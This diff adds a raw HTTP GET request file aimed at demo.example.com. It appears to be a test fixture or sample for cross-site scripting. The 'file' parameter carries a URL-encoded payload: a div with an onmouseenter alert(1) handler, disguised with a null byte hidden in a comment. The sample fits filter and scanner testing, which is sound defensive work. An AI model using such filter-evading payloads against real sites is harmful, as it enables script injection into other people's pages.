@@ -1,0 +1,4 @@
+GET /a?file=</*%00*/div%20onmouseenter%3Dalert(1)>hover</div> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
